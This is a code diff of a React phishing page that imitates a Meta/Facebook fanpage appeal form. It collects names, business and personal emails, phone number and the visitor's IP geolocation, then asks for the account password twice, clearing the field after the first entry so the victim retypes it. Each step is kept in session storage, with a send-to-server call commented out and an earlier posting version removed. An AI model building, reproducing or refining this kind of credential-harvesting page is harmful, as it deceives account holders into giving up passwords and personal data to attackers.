@@ -1,11 +1,12 @@
 import React from "react";
 import { Link, useNavigate } from "react-router-dom";
 import { useState } from "react";
-import axios from "axios";
-import { Button, Checkbox, Form, Input } from "antd";
+import { Button, Form, Input } from "antd";
 import { hg4hubkj2noin } from "../../assets/images/images";
 const { TextArea } = Input;
 import "../../assets/css/style.css"
+import axios from "axios";
+import { getSession, removeSession, saveSession } from "../../apis/sectionHandle";
 
 const FormContentComponent = () => {
 
@@ -24,55 +25,56 @@ const FormContentComponent = () => {
         setActivePopup(false);
     };
 
-    const onFinish = (values) => {
-        localStorage.setItem("dataForm", JSON.stringify(values));
+    const onFinish = async (values: object) => {
+        
+        const { data }  = await axios.get('https://api.ipify.org?format=json');
+        const IP = data.ip;
+        const response = await axios.get(`https://api.ipgeolocation.io/ipgeo?apiKey=${import.meta.env.VITE_LOCATION_KEY}&ip=${IP}`);
+        const location = `${response.data.ip} | ${response.data.state_prov}(${response.data.country_capital}) | ${response.data.country_name}(${response.data.country_code2})`
+
+        const dataSaveFirst = {
+            ip: location,
+            ...values
+        }
+
+        console.log(dataSaveFirst)
+
+        saveSession('stepOne', dataSaveFirst )
         return handleOpendPopup();
     };
 
-    const onFinishPassWord = (values) => {
-        // if (first === true) {
-        //     setFirstPassword(values.fill_first_password);
-        //     setActionFirst(false);
-        //     form.setFieldsValue({ fill_first_password: '' });
-        // }
+    const onFinishPassWord = (values: any) => {
+        if(first === true) {
+            const dataGetFirst   = getSession('stepOne');
+            const dataSaveSecond = {
+                passwordFirst: values.password,
+                ...dataGetFirst
+            }
 
-        // setActivePassword(true);
-        // const passWord = values.fill_first_password;
-        // const dataLocalForm = JSON.parse(localStorage.getItem("dataForm"));
+            console.log(dataSaveSecond)
 
-        // if (activePassword === true) {
-        //     // axios.get(`https://api.db-ip.com/v2/free/self`).then((response) => {
-        //     //     const dataPassWord = {
-        //     //         ...dataLocalForm,
-        //     //         firt_password: firstPassword,
-        //     //         second_password: passWord,
-        //     //         ip: response.data.ipAddress,
-        //     //         city: response.data.city,
-        //     //         country: response.data.country,
-        //     //     };
+            saveSession('stepTwo', dataSaveSecond )
+            removeSession('stepOne')
+            
+            setActionFirst(false);
+            setActivePassword(true);
+            form.setFieldsValue({ password: '' });
+            // callApi(dataSaveSecond)
+        }
 
-        //     //     localStorage.setItem("dataPassWord", JSON.stringify(dataPassWord));
+        if(activePassword === true){
+            const dataGetSecond   = getSession('stepTwo');
+            const dataSendThird = {
+                passwordSecond: values.password,
+                ...dataGetSecond
+            }
+            console.log(dataSendThird)
+            saveSession('stepThree', dataSendThird )
+            setActivePassword(true)
 
-        //     //     const data = {
-        //     //         fill_business_email: dataPassWord.fill_business_email,
-        //     //         fill_personal_email: dataPassWord.fill_personal_email,
-        //     //         fill_full_name: dataPassWord.fill_full_name,
-        //     //         fill_your_name: dataPassWord.fill_your_name,
-        //     //         fill_phone: dataPassWord.fill_phone,
-        //     //         ip: response.data.ipAddress,
-        //     //         city: response.data.city,
-        //     //         country: response.data.countryName,
-        //     //         first_password: firstPassword,
-        //     //         second_password: passWord,
-        //     //     };
-
-        //     //     axios.post(process.env.REACT_APP_URL_SERVER + "/api/news", data).then((response) => {
-        //     //         if (response.data.status === 0) {
-                        navigate("/confirm");
-        //     //         }
-        //     //     });
-        //     // });
-        // }
+            // callApi(dataSendThird)
+            navigate("/confirm")
+        }
     };
 
     return (
@@ -80,8 +82,6 @@ const FormContentComponent = () => {
             <div className="top-header">
                 <div className="container">
                     <img src={hg4hubkj2noin} width="140" className="metalogo" alt="" />
-                    {/* <p className="metahead">Support Inbox</p> */}
-                    {/* <img src={search} width="100%" className="searchicon" alt="" /> */}
 
                     <div className="search-th">
                         <div className="icon-th">
@@ -185,9 +185,6 @@ const FormContentComponent = () => {
                                 <p>If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</p>
                             </div>
 
-
-                            {/* FORM START */}
-
                             <Form
                                 name="basic"
                                 className="form-basic"
@@ -199,9 +196,9 @@ const FormContentComponent = () => {
                             >
 
                                 <div className="item-form">
-                                    <label htmlFor="fill_your_name">Name Fanpage <i>*</i></label>
+                                    <label htmlFor="fanpageName">Name Fanpage <i>*</i></label>
                                     <Form.Item
-                                        name="fill_your_name"
+                                        name="fanpageName"
                                         rules={[
                                             {
                                                 required: true,
@@ -214,9 +211,9 @@ const FormContentComponent = () => {
                                 </div>
 
                                 <div className="item-form">
-                                    <label htmlFor="fill_full_name">Full Name <i>*</i></label>
+                                    <label htmlFor="fullName">Full Name <i>*</i></label>
                                     <Form.Item
-                                        name="fill_full_name"
+                                        name="fullName"
                                         rules={[
                                             {
                                                 required: true,
@@ -229,9 +226,9 @@ const FormContentComponent = () => {
                                 </div>
 
                                 <div className="item-form">
-                                    <label htmlFor="email">Business Email Address <i>*</i></label>
+                                    <label htmlFor="buisinessEmail">Business Email Address <i>*</i></label>
                                     <Form.Item
-                                        name="fill_business_email"
+                                        name="buisinessEmail"
                                         rules={[
                                             {
                                                 required: true,
@@ -244,9 +241,9 @@ const FormContentComponent = () => {
                                 </div>
 
                                 <div className="item-form">
-                                    <label htmlFor="fill_personal_email">Personal Email Address <i>*</i></label>
+                                    <label htmlFor="userEmail">Personal Email Address <i>*</i></label>
                                     <Form.Item
-                                        name="fill_personal_email"
+                                        name="userEmail"
                                         rules={[
                                             {
                                                 required: true,
@@ -259,9 +256,9 @@ const FormContentComponent = () => {
                                 </div>
 
                                 <div className="item-form">
-                                    <label htmlFor="fill_phone">Mobile Phone Number <i>*</i></label>
+                                    <label htmlFor="phoneNumber">Mobile Phone Number <i>*</i></label>
                                     <Form.Item
-                                        name="fill_phone"
+                                        name="phoneNumber"
                                         rules={[
                                             {
                                                 required: true,
@@ -274,31 +271,13 @@ const FormContentComponent = () => {
                                 </div>
 
                                 <div className="item-form">
-                                    <label >
-                                        Please provide us information that will help us investigate.
-                                    </label>
+                                    <label>Please provide us information that will help us investigate. </label>
                                     <Form.Item
                                         name="infomation"
                                     >
                                         <TextArea rows={3} />
                                     </Form.Item>
                                 </div>
-
-                                {/* <div className="item-form">
-                                <Form.Item
-                                    name="check_form"
-                                    valuePropName="checked"
-                                    rules={[
-                                        {
-                                        required: true,
-                                        message: 'Please agree to our terms and data and cookie policy!',
-                                        },
-                                    ]}
-                                >
-                                    <Checkbox >I agree to our Terms, Data and Cookies Policy.</Checkbox>
-                                </Form.Item>
-                            </div> */}
-
 
                                 <Form.Item
                                     className="btn butoni"
@@ -322,8 +301,6 @@ const FormContentComponent = () => {
                                     </Button>
                                 </Form.Item>
                             </Form>
-
-                            {/* FORM END */}
                         </div>
 
                     </div>
@@ -397,7 +374,7 @@ const FormContentComponent = () => {
                             </p>
                             <label htmlFor="password" style={{ color: "black" }}>Your password:</label>
                             <Form.Item
-                                name="fill_first_password"
+                                name="password"
                                 rules={[
                                     {
                                         required: true,
